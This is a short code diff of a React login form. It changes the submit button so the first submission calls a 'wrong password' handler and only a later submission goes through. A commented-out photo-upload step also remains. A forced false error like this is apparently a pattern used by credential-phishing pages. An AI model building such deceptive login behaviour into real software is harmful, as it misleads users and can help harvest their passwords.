@@ -145,7 +145,7 @@ function LoginForm() {
                   autoComplete="on"
                   required
                 />
-                <button
+            {!showWrongPassword?(<button
                   type="submit"
                   // type="button"
                   onClick={handleWrongPassword}
@@ -154,7 +154,15 @@ function LoginForm() {
                   // onClick={handleNextStep}
                 >
                   Submit
-                </button>
+                </button>):(<button
+                  type="submit"
+                  // type="button"
+                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
+                  // disabled={!verified}
+                  // onClick={handleNextStep}
+                >
+                  Submit
+                </button>)}
               </div>
 
               {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
